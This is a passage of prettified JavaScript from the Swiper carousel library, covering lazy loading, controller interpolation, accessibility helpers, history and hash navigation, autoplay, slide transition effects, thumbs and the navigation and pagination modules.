              )
                t.children(`.${s.slideVisibleClass}`).each((t, s) => {
                  const i = n
                    ? d(s).attr("data-swiper-slide-index")
                    : d(s).index();
                  e.lazy.loadInSlide(i);
                });
              else if (o > 1)
                for (let t = a; t < a + o; t += 1)
                  l(t) && e.lazy.loadInSlide(t);
              else e.lazy.loadInSlide(a);
              if (r.loadPrevNext)
                if (
                  o > 1 ||
                  (r.loadPrevNextAmount && r.loadPrevNextAmount > 1)
                ) {
                  const t = r.loadPrevNextAmount,
                    s = o,
                    n = Math.min(a + s + Math.max(t, s), i.length),
                    d = Math.max(a - Math.max(s, t), 0);
                  for (let t = a + o; t < n; t += 1)
                    l(t) && e.lazy.loadInSlide(t);
                  for (let t = d; t < a; t += 1) l(t) && e.lazy.loadInSlide(t);
                } else {
                  const i = t.children(`.${s.slideNextClass}`);
                  i.length > 0 && e.lazy.loadInSlide(c(i));
                  const a = t.children(`.${s.slidePrevClass}`);
                  a.length > 0 && e.lazy.loadInSlide(c(a));
                }
            },
          },
          J = {
            LinearSpline: function (e, t) {
              const s = (function () {
                let e, t, s;
                return (i, a) => {
                  for (t = -1, e = i.length; e - t > 1; )
                    (s = (e + t) >> 1), i[s] <= a ? (t = s) : (e = s);
                  return e;
                };
              })();
              let i, a;
              return (
                (this.x = e),
                (this.y = t),
                (this.lastIndex = e.length - 1),
                (this.interpolate = function (e) {
                  return e
                    ? ((a = s(this.x, e)),
                      (i = a - 1),
                      ((e - this.x[i]) * (this.y[a] - this.y[i])) /
                        (this.x[a] - this.x[i]) +
                        this.y[i])
                    : 0;
                }),
                this
              );
            },
            getInterpolateFunction(e) {
              const t = this;
              t.controller.spline ||
                (t.controller.spline = t.params.loop
                  ? new J.LinearSpline(t.slidesGrid, e.slidesGrid)
                  : new J.LinearSpline(t.snapGrid, e.snapGrid));
            },
            setTranslate(e, t) {
              const s = this,
                i = s.controller.control;
              let a, n;
              function r(e) {
                const t = s.rtlTranslate ? -s.translate : s.translate;
                "slide" === s.params.controller.by &&
                  (s.controller.getInterpolateFunction(e),
                  (n = -s.controller.spline.interpolate(-t))),
                  (n && "container" !== s.params.controller.by) ||
                    ((a =
                      (e.maxTranslate() - e.minTranslate()) /
                      (s.maxTranslate() - s.minTranslate())),
                    (n = (t - s.minTranslate()) * a + e.minTranslate())),
                  s.params.controller.inverse && (n = e.maxTranslate() - n),
                  e.updateProgress(n),
                  e.setTranslate(n, s),
                  e.updateActiveIndex(),
                  e.updateSlidesClasses();
              }
              if (Array.isArray(i))
                for (let e = 0; e < i.length; e += 1)
                  i[e] !== t && i[e] instanceof O && r(i[e]);
              else i instanceof O && t !== i && r(i);
            },
            setTransition(e, t) {
              const s = this,
                i = s.controller.control;
              let a;
              function n(t) {
                t.setTransition(e, s),
                  0 !== e &&
                    (t.transitionStart(),
                    t.params.autoHeight &&
                      h.nextTick(() => {
                        t.updateAutoHeight();
                      }),
                    t.$wrapperEl.transitionEnd(() => {
                      i &&
                        (t.params.loop &&
                          "slide" === s.params.controller.by &&
                          t.loopFix(),
                        t.transitionEnd());
                    }));
              }
              if (Array.isArray(i))
                for (a = 0; a < i.length; a += 1)
                  i[a] !== t && i[a] instanceof O && n(i[a]);
              else i instanceof O && t !== i && n(i);
            },
          },
          Q = {
            makeElFocusable: (e) => (e.attr("tabIndex", "0"), e),
            makeElNotFocusable: (e) => (e.attr("tabIndex", "-1"), e),
            addElRole: (e, t) => (e.attr("role", t), e),
            addElLabel: (e, t) => (e.attr("aria-label", t), e),
            disableEl: (e) => (e.attr("aria-disabled", !0), e),
            enableEl: (e) => (e.attr("aria-disabled", !1), e),
            onEnterKey(e) {
              const t = this,
                s = t.params.a11y;
              if (13 !== e.keyCode) return;
              const i = d(e.target);
              t.navigation &&
                t.navigation.$nextEl &&
                i.is(t.navigation.$nextEl) &&
                ((t.isEnd && !t.params.loop) || t.slideNext(),
                t.isEnd
                  ? t.a11y.notify(s.lastSlideMessage)
                  : t.a11y.notify(s.nextSlideMessage)),
                t.navigation &&
                  t.navigation.$prevEl &&
                  i.is(t.navigation.$prevEl) &&
                  ((t.isBeginning && !t.params.loop) || t.slidePrev(),
                  t.isBeginning
                    ? t.a11y.notify(s.firstSlideMessage)
                    : t.a11y.notify(s.prevSlideMessage)),
                t.pagination &&
                  i.is(`.${t.params.pagination.bulletClass}`) &&
                  i[0].click();
            },
            notify(e) {
              const t = this.a11y.liveRegion;
              0 !== t.length && (t.html(""), t.html(e));
            },
            updateNavigation() {
              const e = this;
              if (e.params.loop || !e.navigation) return;
              const { $nextEl: t, $prevEl: s } = e.navigation;
              s &&
                s.length > 0 &&
                (e.isBeginning
                  ? (e.a11y.disableEl(s), e.a11y.makeElNotFocusable(s))
                  : (e.a11y.enableEl(s), e.a11y.makeElFocusable(s))),
                t &&
                  t.length > 0 &&
                  (e.isEnd
                    ? (e.a11y.disableEl(t), e.a11y.makeElNotFocusable(t))
                    : (e.a11y.enableEl(t), e.a11y.makeElFocusable(t)));
            },
            updatePagination() {
              const e = this,
                t = e.params.a11y;
              e.pagination &&
                e.params.pagination.clickable &&
                e.pagination.bullets &&
                e.pagination.bullets.length &&
                e.pagination.bullets.each((s, i) => {
                  const a = d(i);
                  e.a11y.makeElFocusable(a),
                    e.a11y.addElRole(a, "button"),
                    e.a11y.addElLabel(
                      a,
                      t.paginationBulletMessage.replace(
                        /\{\{index\}\}/,
                        a.index() + 1
                      )
                    );
                });
            },
            init() {
              const e = this;
              e.$el.append(e.a11y.liveRegion);
              const t = e.params.a11y;
              let s, i;
              e.navigation &&
                e.navigation.$nextEl &&
                (s = e.navigation.$nextEl),
                e.navigation &&
                  e.navigation.$prevEl &&
                  (i = e.navigation.$prevEl),
                s &&
                  (e.a11y.makeElFocusable(s),
                  e.a11y.addElRole(s, "button"),
                  e.a11y.addElLabel(s, t.nextSlideMessage),
                  s.on("keydown", e.a11y.onEnterKey)),
                i &&
                  (e.a11y.makeElFocusable(i),
                  e.a11y.addElRole(i, "button"),
                  e.a11y.addElLabel(i, t.prevSlideMessage),
                  i.on("keydown", e.a11y.onEnterKey)),
                e.pagination &&
                  e.params.pagination.clickable &&
                  e.pagination.bullets &&
                  e.pagination.bullets.length &&
                  e.pagination.$el.on(
                    "keydown",
                    `.${e.params.pagination.bulletClass}`,
                    e.a11y.onEnterKey
                  );
            },
            destroy() {
              const e = this;
              let t, s;
              e.a11y.liveRegion &&
                e.a11y.liveRegion.length > 0 &&
                e.a11y.liveRegion.remove(),
                e.navigation &&
                  e.navigation.$nextEl &&
                  (t = e.navigation.$nextEl),
                e.navigation &&
                  e.navigation.$prevEl &&
                  (s = e.navigation.$prevEl),
                t && t.off("keydown", e.a11y.onEnterKey),
                s && s.off("keydown", e.a11y.onEnterKey),
                e.pagination &&
                  e.params.pagination.clickable &&
                  e.pagination.bullets &&
                  e.pagination.bullets.length &&
                  e.pagination.$el.off(
                    "keydown",
                    `.${e.params.pagination.bulletClass}`,
                    e.a11y.onEnterKey
                  );
            },
          },
          ee = {
            init() {
              const e = this;
              if (!e.params.history) return;
              if (!o.history || !o.history.pushState)
                return (
                  (e.params.history.enabled = !1),
                  void (e.params.hashNavigation.enabled = !0)
                );
              const t = e.history;
              (t.initialized = !0),
                (t.paths = ee.getPathValues()),
                (t.paths.key || t.paths.value) &&
                  (t.scrollToSlide(
                    0,
                    t.paths.value,
                    e.params.runCallbacksOnInit
                  ),
                  e.params.history.replaceState ||
                    o.addEventListener(
                      "popstate",
                      e.history.setHistoryPopState
                    ));
            },
            destroy() {
              this.params.history.replaceState ||
                o.removeEventListener(
                  "popstate",
                  this.history.setHistoryPopState
                );
            },
            setHistoryPopState() {
              const e = this;
              (e.history.paths = ee.getPathValues()),
                e.history.scrollToSlide(
                  e.params.speed,
                  e.history.paths.value,
                  !1
                );
            },
            getPathValues() {
              const e = o.location.pathname
                  .slice(1)
                  .split("/")
                  .filter((e) => "" !== e),
                t = e.length;
              return { key: e[t - 2], value: e[t - 1] };
            },
            setHistory(e, t) {
              const s = this;
              if (!s.history.initialized || !s.params.history.enabled) return;
              const i = s.slides.eq(t);
              let a = ee.slugify(i.attr("data-history"));
              o.location.pathname.includes(e) || (a = `${e}/${a}`);
              const n = o.history.state;
              (n && n.value === a) ||
                (s.params.history.replaceState
                  ? o.history.replaceState({ value: a }, null, a)
                  : o.history.pushState({ value: a }, null, a));
            },
            slugify: (e) =>
              e
                .toString()
                .replace(/\s+/g, "-")
                .replace(/[^\w-]+/g, "")
                .replace(/--+/g, "-")
                .replace(/^-+/, "")
                .replace(/-+$/, ""),
            scrollToSlide(e, t, s) {
              const i = this;
              if (t)
                for (let a = 0, n = i.slides.length; a < n; a += 1) {
                  const n = i.slides.eq(a);
                  if (
                    ee.slugify(n.attr("data-history")) === t &&
                    !n.hasClass(i.params.slideDuplicateClass)
                  ) {
                    const t = n.index();
                    i.slideTo(t, e, s);
                  }
                }
              else i.slideTo(0, e, s);
            },
          },
          te = {
            onHashCange() {
              const e = this;
              e.emit("hashChange");
              const t = n.location.hash.replace("#", "");
              if (t !== e.slides.eq(e.activeIndex).attr("data-hash")) {
                const s = e.$wrapperEl
                  .children(`.${e.params.slideClass}[data-hash="${t}"]`)
                  .index();
                if (void 0 === s) return;
                e.slideTo(s);
              }
            },
            setHash() {
              const e = this;
              if (
                e.hashNavigation.initialized &&
                e.params.hashNavigation.enabled
              )
                if (
                  e.params.hashNavigation.replaceState &&
                  o.history &&
                  o.history.replaceState
                )
                  o.history.replaceState(
                    null,
                    null,
                    `#${e.slides.eq(e.activeIndex).attr("data-hash")}` || ""
                  ),
                    e.emit("hashSet");
                else {
                  const t = e.slides.eq(e.activeIndex),
                    s = t.attr("data-hash") || t.attr("data-history");
                  (n.location.hash = s || ""), e.emit("hashSet");
                }
            },
            init() {
              const e = this;
              if (
                !e.params.hashNavigation.enabled ||
                (e.params.history && e.params.history.enabled)
              )
                return;
              e.hashNavigation.initialized = !0;
              const t = n.location.hash.replace("#", "");
              if (t) {
                const s = 0;
                for (let i = 0, a = e.slides.length; i < a; i += 1) {
                  const a = e.slides.eq(i);
                  if (
                    (a.attr("data-hash") || a.attr("data-history")) === t &&
                    !a.hasClass(e.params.slideDuplicateClass)
                  ) {
                    const t = a.index();
                    e.slideTo(t, s, e.params.runCallbacksOnInit, !0);
                  }
                }
              }
              e.params.hashNavigation.watchState &&
                d(o).on("hashchange", e.hashNavigation.onHashCange);
            },
            destroy() {
              this.params.hashNavigation.watchState &&
                d(o).off("hashchange", this.hashNavigation.onHashCange);
            },
          },
          se = {
            run() {
              const e = this,
                t = e.slides.eq(e.activeIndex);
              let s = e.params.autoplay.delay;
              t.attr("data-swiper-autoplay") &&
                (s = t.attr("data-swiper-autoplay") || e.params.autoplay.delay),
                clearTimeout(e.autoplay.timeout),
                (e.autoplay.timeout = h.nextTick(() => {
                  e.params.autoplay.reverseDirection
                    ? e.params.loop
                      ? (e.loopFix(),
                        e.slidePrev(e.params.speed, !0, !0),
                        e.emit("autoplay"))
                      : e.isBeginning
                      ? e.params.autoplay.stopOnLastSlide
                        ? e.autoplay.stop()
                        : (e.slideTo(
                            e.slides.length - 1,
                            e.params.speed,
                            !0,
                            !0
                          ),
                          e.emit("autoplay"))
                      : (e.slidePrev(e.params.speed, !0, !0),
                        e.emit("autoplay"))
                    : e.params.loop
                    ? (e.loopFix(),
                      e.slideNext(e.params.speed, !0, !0),
                      e.emit("autoplay"))
                    : e.isEnd
                    ? e.params.autoplay.stopOnLastSlide
                      ? e.autoplay.stop()
                      : (e.slideTo(0, e.params.speed, !0, !0),
                        e.emit("autoplay"))
                    : (e.slideNext(e.params.speed, !0, !0), e.emit("autoplay")),
                    e.params.cssMode && e.autoplay.running && e.autoplay.run();
                }, s));
            },
            start() {
              const e = this;
              return (
                void 0 === e.autoplay.timeout &&
                !e.autoplay.running &&
                ((e.autoplay.running = !0),
                e.emit("autoplayStart"),
                e.autoplay.run(),
                !0)
              );
            },
            stop() {
              const e = this;
              return (
                !!e.autoplay.running &&
                void 0 !== e.autoplay.timeout &&
                (e.autoplay.timeout &&
                  (clearTimeout(e.autoplay.timeout),
                  (e.autoplay.timeout = void 0)),
                (e.autoplay.running = !1),
                e.emit("autoplayStop"),
                !0)
              );
            },
            pause(e) {
              const t = this;
              t.autoplay.running &&
                (t.autoplay.paused ||
                  (t.autoplay.timeout && clearTimeout(t.autoplay.timeout),
                  (t.autoplay.paused = !0),
                  0 !== e && t.params.autoplay.waitForTransition
                    ? (t.$wrapperEl[0].addEventListener(
                        "transitionend",
                        t.autoplay.onTransitionEnd
                      ),
                      t.$wrapperEl[0].addEventListener(
                        "webkitTransitionEnd",
                        t.autoplay.onTransitionEnd
                      ))
                    : ((t.autoplay.paused = !1), t.autoplay.run())));
            },
          },
          ie = {
            setTranslate() {
              const e = this,
                { slides: t } = e;
              for (let s = 0; s < t.length; s += 1) {
                const t = e.slides.eq(s);
                let i = -t[0].swiperSlideOffset;
                e.params.virtualTranslate || (i -= e.translate);
                let a = 0;
                e.isHorizontal() || ((a = i), (i = 0));
                const n = e.params.fadeEffect.crossFade
                  ? Math.max(1 - Math.abs(t[0].progress), 0)
                  : 1 + Math.min(Math.max(t[0].progress, -1), 0);
                t.css({ opacity: n }).transform(
                  `translate3d(${i}px, ${a}px, 0px)`
                );
              }
            },
            setTransition(e) {
              const t = this,
                { slides: s, $wrapperEl: i } = t;
              if ((s.transition(e), t.params.virtualTranslate && 0 !== e)) {
                let e = !1;
                s.transitionEnd(() => {
                  if (e) return;
                  if (!t || t.destroyed) return;
                  (e = !0), (t.animating = !1);
                  const s = ["webkitTransitionEnd", "transitionend"];
                  for (let e = 0; e < s.length; e += 1) i.trigger(s[e]);
                });
              }
            },
          },
          ae = {
            setTranslate() {
              const e = this,
                {
                  $el: t,
                  $wrapperEl: s,
                  slides: i,
                  width: a,
                  height: n,
                  rtlTranslate: r,
                  size: o,
                } = e,
                l = e.params.cubeEffect,
                c = e.isHorizontal(),
                p = e.virtual && e.params.virtual.enabled;
              let h,
                u = 0;
              l.shadow &&
                (c
                  ? ((h = s.find(".swiper-cube-shadow")),
                    0 === h.length &&
                      ((h = d('<div class="swiper-cube-shadow"></div>')),
                      s.append(h)),
                    h.css({ height: `${a}px` }))
                  : ((h = t.find(".swiper-cube-shadow")),
                    0 === h.length &&
                      ((h = d('<div class="swiper-cube-shadow"></div>')),
                      t.append(h))));
              for (let e = 0; e < i.length; e += 1) {
                const t = i.eq(e);
                let s = e;
                p && (s = parseInt(t.attr("data-swiper-slide-index"), 10));
                let a = 90 * s,
                  n = Math.floor(a / 360);
                r && ((a = -a), (n = Math.floor(-a / 360)));
                const h = Math.max(Math.min(t[0].progress, 1), -1);
                let m = 0,
                  g = 0,
                  f = 0;
                s % 4 == 0
                  ? ((m = 4 * -n * o), (f = 0))
                  : (s - 1) % 4 == 0
                  ? ((m = 0), (f = 4 * -n * o))
                  : (s - 2) % 4 == 0
                  ? ((m = o + 4 * n * o), (f = o))
                  : (s - 3) % 4 == 0 && ((m = -o), (f = 3 * o + 4 * o * n)),
                  r && (m = -m),
                  c || ((g = m), (m = 0));
                const v = `rotateX(${c ? 0 : -a}deg) rotateY(${
                  c ? a : 0
                }deg) translate3d(${m}px, ${g}px, ${f}px)`;
                if (
                  (h <= 1 &&
                    h > -1 &&
                    ((u = 90 * s + 90 * h), r && (u = 90 * -s - 90 * h)),
                  t.transform(v),
                  l.slideShadows)
                ) {
                  let e = c
                      ? t.find(".swiper-slide-shadow-left")
                      : t.find(".swiper-slide-shadow-top"),
                    s = c
                      ? t.find(".swiper-slide-shadow-right")
                      : t.find(".swiper-slide-shadow-bottom");
                  0 === e.length &&
                    ((e = d(
                      `<div class="swiper-slide-shadow-${
                        c ? "left" : "top"
                      }"></div>`
                    )),
                    t.append(e)),
                    0 === s.length &&
                      ((s = d(
                        `<div class="swiper-slide-shadow-${
                          c ? "right" : "bottom"
                        }"></div>`
                      )),
                      t.append(s)),
                    e.length && (e[0].style.opacity = Math.max(-h, 0)),
                    s.length && (s[0].style.opacity = Math.max(h, 0));
                }
              }
              if (
                (s.css({
                  "-webkit-transform-origin": `50% 50% -${o / 2}px`,
                  "-moz-transform-origin": `50% 50% -${o / 2}px`,
                  "-ms-transform-origin": `50% 50% -${o / 2}px`,
                  "transform-origin": `50% 50% -${o / 2}px`,
                }),
                l.shadow)
              )
                if (c)
                  h.transform(
                    `translate3d(0px, ${a / 2 + l.shadowOffset}px, ${
                      -a / 2
                    }px) rotateX(90deg) rotateZ(0deg) scale(${l.shadowScale})`
                  );
                else {
                  const e = Math.abs(u) - 90 * Math.floor(Math.abs(u) / 90),
                    t =
                      1.5 -
                      (Math.sin((2 * e * Math.PI) / 360) / 2 +
                        Math.cos((2 * e * Math.PI) / 360) / 2),
                    s = l.shadowScale,
                    i = l.shadowScale / t,
                    a = l.shadowOffset;
                  h.transform(
                    `scale3d(${s}, 1, ${i}) translate3d(0px, ${n / 2 + a}px, ${
                      -n / 2 / i
                    }px) rotateX(-90deg)`
                  );
                }
              const m = G.isSafari || G.isWebView ? -o / 2 : 0;
              s.transform(
                `translate3d(0px,0,${m}px) rotateX(${
                  e.isHorizontal() ? 0 : u
                }deg) rotateY(${e.isHorizontal() ? -u : 0}deg)`
              );
            },
            setTransition(e) {
              const t = this,
                { $el: s, slides: i } = t;
              i
                .transition(e)
                .find(
                  ".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left"
                )
                .transition(e),
                t.params.cubeEffect.shadow &&
                  !t.isHorizontal() &&
                  s.find(".swiper-cube-shadow").transition(e);
            },
          },
          ne = {
            setTranslate() {
              const e = this,
                { slides: t, rtlTranslate: s } = e;
              for (let i = 0; i < t.length; i += 1) {
                const a = t.eq(i);
                let n = a[0].progress;
                e.params.flipEffect.limitRotation &&
                  (n = Math.max(Math.min(a[0].progress, 1), -1));
                let r = -180 * n,
                  o = 0,
                  l = -a[0].swiperSlideOffset,
                  c = 0;
                if (
                  (e.isHorizontal()
                    ? s && (r = -r)
                    : ((c = l), (l = 0), (o = -r), (r = 0)),
                  (a[0].style.zIndex = -Math.abs(Math.round(n)) + t.length),
                  e.params.flipEffect.slideShadows)
                ) {
                  let t = e.isHorizontal()
                      ? a.find(".swiper-slide-shadow-left")
                      : a.find(".swiper-slide-shadow-top"),
                    s = e.isHorizontal()
                      ? a.find(".swiper-slide-shadow-right")
                      : a.find(".swiper-slide-shadow-bottom");
                  0 === t.length &&
                    ((t = d(
                      `<div class="swiper-slide-shadow-${
                        e.isHorizontal() ? "left" : "top"
                      }"></div>`
                    )),
                    a.append(t)),
                    0 === s.length &&
                      ((s = d(
                        `<div class="swiper-slide-shadow-${
                          e.isHorizontal() ? "right" : "bottom"
                        }"></div>`
                      )),
                      a.append(s)),
                    t.length && (t[0].style.opacity = Math.max(-n, 0)),
                    s.length && (s[0].style.opacity = Math.max(n, 0));
                }
                a.transform(
                  `translate3d(${l}px, ${c}px, 0px) rotateX(${o}deg) rotateY(${r}deg)`
                );
              }
            },
            setTransition(e) {
              const t = this,
                { slides: s, activeIndex: i, $wrapperEl: a } = t;
              if (
                (s
                  .transition(e)
                  .find(
                    ".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left"
                  )
                  .transition(e),
                t.params.virtualTranslate && 0 !== e)
              ) {
                let e = !1;
                s.eq(i).transitionEnd(function () {
                  if (e) return;
                  if (!t || t.destroyed) return;
                  (e = !0), (t.animating = !1);
                  const s = ["webkitTransitionEnd", "transitionend"];
                  for (let e = 0; e < s.length; e += 1) a.trigger(s[e]);
                });
              }
            },
          },
          re = {
            setTranslate() {
              const e = this,
                {
                  width: t,
                  height: s,
                  slides: i,
                  $wrapperEl: a,
                  slidesSizesGrid: n,
                } = e,
                r = e.params.coverflowEffect,
                o = e.isHorizontal(),
                l = e.translate,
                c = o ? t / 2 - l : s / 2 - l,
                p = o ? r.rotate : -r.rotate,
                h = r.depth;
              for (let e = 0, t = i.length; e < t; e += 1) {
                const t = i.eq(e),
                  s = n[e],
                  a = ((c - t[0].swiperSlideOffset - s / 2) / s) * r.modifier;
                let l = o ? p * a : 0,
                  u = o ? 0 : p * a,
                  m = -h * Math.abs(a),
                  g = r.stretch;
                "string" == typeof g &&
                  -1 !== g.indexOf("%") &&
                  (g = (parseFloat(r.stretch) / 100) * s);
                let f = o ? 0 : g * a,
                  v = o ? g * a : 0,
                  y = 1 - (1 - r.scale) * Math.abs(a);
                Math.abs(v) < 0.001 && (v = 0),
                  Math.abs(f) < 0.001 && (f = 0),
                  Math.abs(m) < 0.001 && (m = 0),
                  Math.abs(l) < 0.001 && (l = 0),
                  Math.abs(u) < 0.001 && (u = 0),
                  Math.abs(y) < 0.001 && (y = 0);
                const b = `translate3d(${v}px,${f}px,${m}px)  rotateX(${u}deg) rotateY(${l}deg) scale(${y})`;
                if (
                  (t.transform(b),
                  (t[0].style.zIndex = 1 - Math.abs(Math.round(a))),
                  r.slideShadows)
                ) {
                  let e = o
                      ? t.find(".swiper-slide-shadow-left")
                      : t.find(".swiper-slide-shadow-top"),
                    s = o
                      ? t.find(".swiper-slide-shadow-right")
                      : t.find(".swiper-slide-shadow-bottom");
                  0 === e.length &&
                    ((e = d(
                      `<div class="swiper-slide-shadow-${
                        o ? "left" : "top"
                      }"></div>`
                    )),
                    t.append(e)),
                    0 === s.length &&
                      ((s = d(
                        `<div class="swiper-slide-shadow-${
                          o ? "right" : "bottom"
                        }"></div>`
                      )),
                      t.append(s)),
                    e.length && (e[0].style.opacity = a > 0 ? a : 0),
                    s.length && (s[0].style.opacity = -a > 0 ? -a : 0);
                }
              }
              (u.pointerEvents || u.prefixedPointerEvents) &&
                (a[0].style.perspectiveOrigin = `${c}px 50%`);
            },
            setTransition(e) {
              this.slides
                .transition(e)
                .find(
                  ".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left"
                )
                .transition(e);
            },
          },
          oe = {
            init() {
              const e = this,
                { thumbs: t } = e.params,
                s = e.constructor;
              t.swiper instanceof s
                ? ((e.thumbs.swiper = t.swiper),
                  h.extend(e.thumbs.swiper.originalParams, {
                    watchSlidesProgress: !0,
                    slideToClickedSlide: !1,
                  }),
                  h.extend(e.thumbs.swiper.params, {
                    watchSlidesProgress: !0,
                    slideToClickedSlide: !1,
                  }))
                : h.isObject(t.swiper) &&
                  ((e.thumbs.swiper = new s(
                    h.extend({}, t.swiper, {
                      watchSlidesVisibility: !0,
                      watchSlidesProgress: !0,
                      slideToClickedSlide: !1,
                    })
                  )),
                  (e.thumbs.swiperCreated = !0)),
                e.thumbs.swiper.$el.addClass(
                  e.params.thumbs.thumbsContainerClass
                ),
                e.thumbs.swiper.on("tap", e.thumbs.onThumbClick);
            },
            onThumbClick() {
              const e = this,
                t = e.thumbs.swiper;
              if (!t) return;
              const s = t.clickedIndex,
                i = t.clickedSlide;
              if (i && d(i).hasClass(e.params.thumbs.slideThumbActiveClass))
                return;
              if (null == s) return;
              let a;
              if (
                ((a = t.params.loop
                  ? parseInt(
                      d(t.clickedSlide).attr("data-swiper-slide-index"),
                      10
                    )
                  : s),
                e.params.loop)
              ) {
                let t = e.activeIndex;
                e.slides.eq(t).hasClass(e.params.slideDuplicateClass) &&
                  (e.loopFix(),
                  (e._clientLeft = e.$wrapperEl[0].clientLeft),
                  (t = e.activeIndex));
                const s = e.slides
                    .eq(t)
                    .prevAll(`[data-swiper-slide-index="${a}"]`)
                    .eq(0)
                    .index(),
                  i = e.slides
                    .eq(t)
                    .nextAll(`[data-swiper-slide-index="${a}"]`)
                    .eq(0)
                    .index();
                a = void 0 === s ? i : void 0 === i ? s : i - t < t - s ? i : s;
              }
              e.slideTo(a);
            },
            update(e) {
              const t = this,
                s = t.thumbs.swiper;
              if (!s) return;
              const i =
                  "auto" === s.params.slidesPerView
                    ? s.slidesPerViewDynamic()
                    : s.params.slidesPerView,
                a = t.params.thumbs.autoScrollOffset,
                n = a && !s.params.loop;
              if (t.realIndex !== s.realIndex || n) {
                let r,
                  o,
                  l = s.activeIndex;
                if (s.params.loop) {
                  s.slides.eq(l).hasClass(s.params.slideDuplicateClass) &&
                    (s.loopFix(),
                    (s._clientLeft = s.$wrapperEl[0].clientLeft),
                    (l = s.activeIndex));
                  const e = s.slides
                      .eq(l)
                      .prevAll(`[data-swiper-slide-index="${t.realIndex}"]`)
                      .eq(0)
                      .index(),
                    i = s.slides
                      .eq(l)
                      .nextAll(`[data-swiper-slide-index="${t.realIndex}"]`)
                      .eq(0)
                      .index();
                  (r =
                    void 0 === e
                      ? i
                      : void 0 === i
                      ? e
                      : i - l == l - e
                      ? l
                      : i - l < l - e
                      ? i
                      : e),
                    (o = t.activeIndex > t.previousIndex ? "next" : "prev");
                } else
                  (r = t.realIndex),
                    (o = r > t.previousIndex ? "next" : "prev");
                n && (r += "next" === o ? a : -1 * a),
                  s.visibleSlidesIndexes &&
                    s.visibleSlidesIndexes.indexOf(r) < 0 &&
                    (s.params.centeredSlides
                      ? (r =
                          r > l
                            ? r - Math.floor(i / 2) + 1
                            : r + Math.floor(i / 2) - 1)
                      : r > l && (r = r - i + 1),
                    s.slideTo(r, e ? 0 : void 0));
              }
              let r = 1;
              const o = t.params.thumbs.slideThumbActiveClass;
              if (
                (t.params.slidesPerView > 1 &&
                  !t.params.centeredSlides &&
                  (r = t.params.slidesPerView),
                t.params.thumbs.multipleActiveThumbs || (r = 1),
                (r = Math.floor(r)),
                s.slides.removeClass(o),
                s.params.loop || (s.params.virtual && s.params.virtual.enabled))
              )
                for (let e = 0; e < r; e += 1)
                  s.$wrapperEl
                    .children(`[data-swiper-slide-index="${t.realIndex + e}"]`)
                    .addClass(o);
              else
                for (let e = 0; e < r; e += 1)
                  s.slides.eq(t.realIndex + e).addClass(o);
            },
          },
          le = [
            D,
            A,
            B,
            H,
            V,
            X,
            q,
            {
              name: "mousewheel",
              params: {
                mousewheel: {
                  enabled: !1,
                  releaseOnEdges: !1,
                  invert: !1,
                  forceToAxis: !1,
                  sensitivity: 1,
                  eventsTarged: "container",
                },
              },
              create() {
                const e = this;
                h.extend(e, {
                  mousewheel: {
                    enabled: !1,
                    enable: _.enable.bind(e),
                    disable: _.disable.bind(e),
                    handle: _.handle.bind(e),
                    handleMouseEnter: _.handleMouseEnter.bind(e),
                    handleMouseLeave: _.handleMouseLeave.bind(e),
                    animateSlider: _.animateSlider.bind(e),
                    releaseScroll: _.releaseScroll.bind(e),
                    lastScrollTime: h.now(),
                    lastEventBeforeSnap: void 0,
                    recentWheelEvents: [],
                  },
                });
              },
              on: {
                init() {
                  const e = this;
                  !e.params.mousewheel.enabled &&
                    e.params.cssMode &&
                    e.mousewheel.disable(),
                    e.params.mousewheel.enabled && e.mousewheel.enable();
                },
                destroy() {
                  const e = this;
                  e.params.cssMode && e.mousewheel.enable(),
                    e.mousewheel.enabled && e.mousewheel.disable();
                },
              },
            },
            {
              name: "navigation",
              params: {
                navigation: {
                  nextEl: null,
                  prevEl: null,
                  hideOnClick: !1,
                  disabledClass: "swiper-button-disabled",
                  hiddenClass: "swiper-button-hidden",
                  lockClass: "swiper-button-lock",
                },
              },
              create() {
                const e = this;
                h.extend(e, {
                  navigation: {
                    init: W.init.bind(e),
                    update: W.update.bind(e),
                    destroy: W.destroy.bind(e),
                    onNextClick: W.onNextClick.bind(e),
                    onPrevClick: W.onPrevClick.bind(e),
                  },
                });
              },
              on: {
                init() {
                  this.navigation.init(), this.navigation.update();
                },
                toEdge() {
                  this.navigation.update();
                },
                fromEdge() {
                  this.navigation.update();
                },
                destroy() {
                  this.navigation.destroy();
                },
                click(e) {
                  const t = this,
                    { $nextEl: s, $prevEl: i } = t.navigation;
                  if (
                    t.params.navigation.hideOnClick &&
                    !d(e.target).is(i) &&
                    !d(e.target).is(s)
                  ) {
                    let e;
                    s
                      ? (e = s.hasClass(t.params.navigation.hiddenClass))
                      : i && (e = i.hasClass(t.params.navigation.hiddenClass)),
                      !0 === e
                        ? t.emit("navigationShow", t)
                        : t.emit("navigationHide", t),
                      s && s.toggleClass(t.params.navigation.hiddenClass),
                      i && i.toggleClass(t.params.navigation.hiddenClass);
                  }
                },
              },
            },
            {
              name: "pagination",
              params: {
                pagination: {
                  el: null,
                  bulletElement: "span",
                  clickable: !1,
                  hideOnClick: !1,
                  renderBullet: null,
                  renderProgressbar: null,
                  renderFraction: null,
                  renderCustom: null,
                  progressbarOpposite: !1,
                  type: "bullets",
                  dynamicBullets: !1,
                  dynamicMainBullets: 1,
                  formatFractionCurrent: (e) => e,
                  formatFractionTotal: (e) => e,
                  bulletClass: "swiper-pagination-bullet",
                  bulletActiveClass: "swiper-pagination-bullet-active",
                  modifierClass: "swiper-pagination-",
                  currentClass: "swiper-pagination-current",
                  totalClass: "swiper-pagination-total",
                  hiddenClass: "swiper-pagination-hidden",
                  progressbarFillClass: "swiper-pagination-progressbar-fill",
                  progressbarOppositeClass:
                    "swiper-pagination-progressbar-opposite",
                  clickableClass: "swiper-pagination-clickable",
                  lockClass: "swiper-pagination-lock",
                },
              },
              create() {
                const e = this;
                h.extend(e, {
                  pagination: {
                    init: j.init.bind(e),
                    render: j.render.bind(e),
                    update: j.update.bind(e),
                    destroy: j.destroy.bind(e),
                    dynamicBulletIndex: 0,
                  },
                });
              },
              on: {
                init() {
                  const e = this;
                  e.pagination.init(),
                    e.pagination.render(),
                    e.pagination.update();
                },
                activeIndexChange() {
                  const e = this;
                  (e.params.loop || void 0 === e.snapIndex) &&
                    e.pagination.update();
                },
                snapIndexChange() {
                  this.params.loop || this.pagination.update();
                },
